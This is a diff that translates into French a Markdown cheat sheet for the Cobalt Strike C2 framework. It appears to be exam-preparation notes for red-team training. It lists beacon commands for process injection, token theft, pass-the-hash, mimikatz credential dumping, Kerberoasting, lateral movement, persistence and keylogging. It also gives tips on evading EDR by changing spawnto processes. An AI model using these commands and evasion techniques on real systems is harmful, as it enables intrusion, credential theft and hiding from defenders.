@@ -1,17 +1,17 @@
-# Cobalt Strike Primer  
+# Introduction à Cobalt Strike  
 
->Initial prep for Cobalt Strike command & control C2 framework  
+>Préparation initiale du framework Command & Control (**C2**) Cobalt Strike  
 
-## Beacon Interact Window — Overview
+## Fenêtre Interact du Beacon — Présentation
 
-When you double-click a beacon in the CS console, the **Interact** tab opens.
-- Top pane: beacon output (responses from implant)
-- Bottom pane: command input
-- Tab-complete works on most commands
+Dans la console Cobalt Strike, un double-clic sur un Beacon ouvre l'onglet **Interact**.
+- Panneau supérieur : sortie du Beacon (réponses de l'implant)
+- Panneau inférieur : saisie des commandes
+- Autocomplétion Tab disponible sur la plupart des commandes
 
 >[OPSEC Consideration for Beacon Commands](https://www.cobaltstrike.com/blog/opsec-considerations-for-beacon-commands)  
 
-## Beacon Commands - OPSEC SAFE ✅
+## Commandes Beacon — OPSEC SAFE
 
 ```
 getuid                      # Who am I? (domain\user + integrity level)
@@ -44,7 +44,7 @@ beacon> ipconfig                # Network config
 beacon> netstat                 # Active connections
 ```
 
-## Beacon Commands - OPSEC CAUTION💡
+## Commandes Beacon — OPSEC CAUTION
 
 ```
 shell schtasks          # list current scheduled task on beacon host
@@ -52,11 +52,11 @@ shell schtasks          # list current scheduled task on beacon host
 ```
 
 
-**OPSEC:** Keep sleep ≥ 30s in exam. Default profile sleep from `set sleeptime`.
+**OPSEC :** dans les notes d'examen, conserver un sleep d'au moins 30 secondes ; le profil par défaut est configuré via `set sleeptime`.
 
 ---
 
-## File System
+## File System — Fichiers
 
 ```
 beacon> ls                      # List current directory
@@ -71,7 +71,7 @@ beacon> upload /local/file.exe  # Upload file from CS client to target
 
 ---
 
-## Process Management
+## Process Management — Processus
 
 ```
 beacon> process_browser         # GUI tab — process list with inject/steal_token/keylog/screenshot per-process options
@@ -80,11 +80,11 @@ beacon> inject <PID> x64 <listener>   # Inject shellcode into running process
 beacon> migrate <PID>           # Migrate beacon to another process (changes PID)
 ```
 
-**OPSEC:** `migrate` and `inject` use `CreateRemoteThread` by default — detectable.
+**OPSEC :** `migrate` et `inject` utilisent `CreateRemoteThread` par défaut, ce qui peut être détecté.
 
 ---
 
-## Spawn & Token Manipulation
+## Spawn et gestion des tokens
 
 ```
 beacon> getuid                  # Current user context
@@ -96,25 +96,21 @@ beacon> getsystem               # Attempt privilege escalation (multiple techniq
 beacon> getuid                  # Confirm new context after token ops
 ```
 
-**OPSEC:** `steal_token` is SAFE — no new process. `pth` — SAFE (no 4624 logon type 3 from beacon host for SMB, but does call CreateProcessWithLogonW).
+**OPSEC :** `steal_token` est classé SAFE dans ces notes, sans nouveau processus. `pth` y est également classé SAFE, bien qu'il utilise `CreateProcessWithLogonW`.
 
 ---
 
-## Spawn-To Override (CRITICAL for OPSEC)
+## Configuration de spawnto — OPSEC
 
-### Why spawnto matters
+### Pourquoi spawnto est important
 
-When CS runs post-ex commands (`execute-assembly`, `powerpick`, `inject`, etc.) it cannot
-run them inside the beacon process — too risky, a crash kills the beacon. Instead it spawns
-a **temporary sacrificial process**, does the work there, then kills it.
+Pour certaines commandes post-exploitation (`execute-assembly`, `powerpick`, `inject`, etc.), Cobalt Strike exécute le payload dans un **processus temporaire** plutôt que dans celui du Beacon afin d'éviter qu'un crash ne termine le Beacon.
 
-**The problem:** The default sacrificial process is `rundll32.exe` — every EDR watches for
-this. A `rundll32.exe` spawning from your beacon process is an immediate red flag.
+**Problème :** le processus temporaire par défaut est `rundll32.exe`, souvent surveillé par les EDR. Son lancement depuis un processus Beacon peut déclencher une alerte.
 
-**`spawnto` fixes this** — you replace `rundll32.exe` with a legitimate-looking Windows
-process that blends into normal host activity.
+**Rôle de `spawnto` :** remplacer `rundll32.exe` par un autre processus Windows servant d'hôte d'exécution.
 
-### Commands
+### Commandes
 
 ```cs
 // Check current spawnto setting
@@ -129,7 +125,7 @@ beacon> spawnto x64 %windir%\sysnative\svchost.exe
 beacon> spawnto x64 %windir%\sysnative\werfault.exe
 ```
 
-### Set permanently in malleable C2 profile (preferred)
+### Configuration permanente dans le Malleable C2 Profile
 
 ```
 post-ex {
@@ -138,10 +134,9 @@ post-ex {
 }
 ```
 
-Profile-level setting applies to all beacons automatically — per-beacon override is for
-adapting to specific host environments after checking `ps` output.
+Une configuration dans le profile s'applique à tous les Beacons. Un override individuel permet de s'adapter au contexte de l'hôte après analyse de `ps`.
 
-### Exam day workflow
+### Workflow pour l'examen
 
 ```
 1. Get beacon callback
@@ -151,11 +146,9 @@ adapting to specific host environments after checking `ps` output.
 5. Now run post-ex commands — sacrificial procs blend into existing process tree
 ```
 
-**Why `dllhost.exe`?** Legitimately spawns constantly in Windows (COM surrogate) —
-an analyst sees it briefly appear and disappear and ignores it. Never leave it as
-`rundll32.exe` — that is a free OPSEC point lost on the exam.
+**Pourquoi `dllhost.exe` ?** Windows l'utilise régulièrement comme COM surrogate. Dans ces notes, il est préféré au `rundll32.exe` par défaut pour limiter les indicateurs inhabituels durant l'examen.
 
-### OPSEC note
+### Note OPSEC
 
 ```
 Tier:       SAFE — changing spawnto itself generates no telemetry
@@ -166,16 +159,16 @@ Resets:     On beacon restart — re-apply after every new beacon or set in prof
 
 ---
 
-## Code Execution — OPSEC Tiers
+## Exécution de code — Niveaux OPSEC
 
-| Command | OPSEC | Notes |
+| Commande | OPSEC | Remarques |
 |---------|-------|-------|
-| `inline-execute <bof.o>` | SAFE | Runs in beacon thread — no spawn |
-| `powerpick <PS cmd>` | SAFE | Unmanaged PS — no powershell.exe |
-| `execute-assembly <asm.exe>` | CAUTION | Fork & run — spawns spawnto proc |
-| `run <cmd>` | UNSAFE | Spawns process — visible child of beacon |
-| `shell <cmd>` | UNSAFE | Spawns cmd.exe |
-| `powershell <cmd>` | UNSAFE | Spawns powershell.exe |
+| `inline-execute <bof.o>` | SAFE | Exécution dans le thread Beacon, sans nouveau processus |
+| `powerpick <PS cmd>` | SAFE | PowerShell unmanaged, sans powershell.exe |
+| `execute-assembly <asm.exe>` | CAUTION | Fork & run avec processus spawnto |
+| `run <cmd>` | UNSAFE | Crée un processus enfant visible du Beacon |
+| `shell <cmd>` | UNSAFE | Lance cmd.exe |
+| `powershell <cmd>` | UNSAFE | Lance powershell.exe |
 
 ```
 beacon> inline-execute /path/to/bof.o [args]
@@ -187,7 +180,7 @@ beacon> shell dir C:\                       # OPSEC-UNSAFE
 
 ---
 
-## Network & Pivoting
+## Réseau et Pivoting
 
 ```
 beacon> portscan <targets> <ports> <discovery> <max-sockets>
@@ -214,7 +207,7 @@ beacon> jump psexec_psh <target> <listener> # psexec via PS — UNSAFE
 
 ---
 
-## Credential Attacks
+## Attaques sur les credentials
 
 ```
 # Kerberoast (SAFE — in-memory)
@@ -234,7 +227,7 @@ beacon> mimikatz lsadump::sam               # UNSAFE
 
 ---
 
-## Domain Recon
+## Reconnaissance du domaine
 
 ```
 # PowerView via powerpick (OPSEC-SAFE)
@@ -268,7 +261,7 @@ beacon> execute-assembly Rubeus.exe ptt /ticket:<base64>
 
 ---
 
-## Listeners & Spawning
+## Listeners et Spawning
 
 ```
 # Spawn a new beacon to a different listener
@@ -283,7 +276,7 @@ beacon> unlink <target> <PID>             # Disconnect P2P beacon
 
 ---
 
-## Persistence (prefer disk-less)
+## Persistence — Privilégier le sans-disque
 
 ```
 # Scheduled task (CAUTION — disk artifact)
@@ -297,7 +290,7 @@ beacon> execute-assembly SharpCOM.exe ...
 
 ---
 
-## Beacon Management
+## Gestion du Beacon
 
 ```
 beacon> note <text>             # Add a note/label to beacon in console
@@ -308,7 +301,7 @@ beacon> exit                    # Kill beacon — use carefully
 
 ---
 
-## Output & Downloads
+## Sorties et téléchargements
 
 ```
 beacon> download <path>         # Queue file for download
@@ -319,7 +312,7 @@ beacon> cancel <filename>       # Cancel a download
 
 ---
 
-## Screenshot & Keylogging (use only if required — noisy)
+## Screenshot et Keylogging — Si nécessaire
 
 ```
 beacon> screenshot              # Single screenshot — OPSEC-CAUTION
@@ -331,7 +324,7 @@ beacon> jobkill <JID>           # Kill a background job
 
 ---
 
-## OPSEC Quick Reference (Exam Day)
+## Référence rapide OPSEC pour l'examen
 
 ```
 SAFE:    inline-execute | powerpick | steal_token | jump winrm | pth
@@ -341,7 +334,7 @@ UNSAFE:  shell | powershell | run | jump psexec | mimikatz direct | screenwatch
 
 ---
 
-## Common Help Lookups
+## Aide et commandes de référence
 
 ```
 beacon> help sleep
